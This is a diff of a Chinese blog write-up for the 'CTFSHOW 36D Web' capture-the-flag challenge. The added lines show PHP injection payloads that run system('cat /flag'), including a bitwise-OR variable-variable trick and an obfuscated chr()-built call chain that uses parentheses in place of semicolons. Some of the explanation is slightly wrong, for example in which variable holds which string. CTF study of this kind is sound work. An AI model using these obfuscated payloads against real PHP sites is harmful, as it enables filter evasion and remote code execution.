@@ -88,7 +88,7 @@
             <h1>CTFSHOW 36D Web</h1>
             <span class="meta">
             	Posted on
-              2020-05-01，6 min read
+              2020-05-01，7 min read
             </span>
           </div>
         </div>
@@ -279,6 +279,20 @@ $c = $ch[1].$ch[5].$ch[4];
 <p>POST<br>
 <code>6=system('cat /flag');</code><br>
 即可</p>
+<p>一个题收获了好多姿势。大佬们tql<br>
+<code>($_ = '@@@@'|'().4') == 1?1:$$_</code><br>
+通过位移运算符。任何左侧的字符|'@'==右侧的字符<br>
+<img src="https://guokeya.github.io/post-images/1588662563005.png" alt="" loading="lazy"><br>
+通过三元运算符。括号内返回hint字符串。然后!=1。就会执行<code>$$_==$hint</code></p>
+<p>还能通过括号和${}配合。动态调用</p>
+<pre><code>($_1=$_{2}.$_{7}.$_{17}).($__=$_1(99).$_1(97).$_1(116).$_1(32).$_1(47).$_1(102).$_1(108).$_1(97).$_1(103)).($_2=$_1(115).$_1(121).$_1(115).$_1(116).$_1(101).$_1(109)).($_2($__))
+</code></pre>
+<p>通过{}取数组中的值。得到<code>$_1=chr</code><br>
+<code>$__=chr(99).chr(97).....</code>得到system<br>
+<code>$_2=chr(xxxx)</code>得到cat /flag<br>
+最后动态执行<code>$_2($__)</code>==system('cat /flag')<br>
+这里有个知识点。用()来代替分号<br>
+<code>($=phpinfo).($a())</code>不需要分号。即可执行phpinfo()</p>
 
           
           <p class="next-post">下一篇：
